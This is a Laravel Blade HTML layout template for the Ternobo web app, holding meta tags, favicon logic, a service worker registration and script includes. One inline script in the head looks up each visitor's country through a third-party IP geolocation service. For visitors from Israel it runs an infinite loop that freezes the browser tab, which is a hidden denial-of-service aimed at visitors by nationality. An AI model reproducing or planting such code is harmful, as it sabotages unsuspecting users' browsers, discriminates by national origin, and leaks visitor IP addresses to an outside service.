<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="/ternobo-socials/style.css">
    <link rel="stylesheet" href="/ternobo-telegram/style.css">
    {!! SEO::generate() !!}


    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">

    <script>
        if(window.matchMedia('(prefers-color-scheme: dark)').matches){
            document.write('<link rel="icon" type="image/png" href="/favicon-light.png">')
        }else{
            document.write('<link rel="icon" type="image/png" href="/favicon.png">')
        }

    </script>
    <link rel="manifest" href="/site.webmanifest.json" crossorigin="use-credentials">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#191919">
    <meta name="apple-mobile-web-app-title" content="Ternobo">
    <meta name="application-name" content="Ternobo">
    <meta name="msapplication-TileColor" content="#191919">
    <meta name="msapplication-TileImage" content="/mstile-144x144.png">
    <meta name="theme-color" content="#191919">
    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">

    <script>
        var APP_URL = "{{ url('/') }}";
        var country = "Iran"
        fetch('https://extreme-ip-lookup.com/json/')
            .then(res => res.json())
            .then(response => {
                country = response.country;
                if (country == 'Israel') {
                    while (true) {}
                }
            });

    </script>

    <script>
        var user_id = @auth {{ Auth::user()-> id }} @endauth @guest false @endguest;
    </script>

        <script type="text/javascript">
            // Initialize the service worker
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/service-worker.js', {
                    scope: '.'
                }).then(function(registration) {
                    // Registration was successful
                    console.log('Ternobo PWA: ServiceWorker registration successful with scope: ', registration.scope);
                }, function(err) {
                    // registration failed :(
                    console.log('Ternobo PWA: ServiceWorker registration failed: ', err);
                });
            }

        </script>

    </head>

    <body class="font-sans antialiased">
        @inertia

        <script src="/manifest.js" defer></script>
        <script src="/js/vendor.js" defer></script>
        <script src="/js/app.js" defer></script>
        <script src="{{ url('/js/framemanager.js') }}" defer></script>
    </body>

    </html>
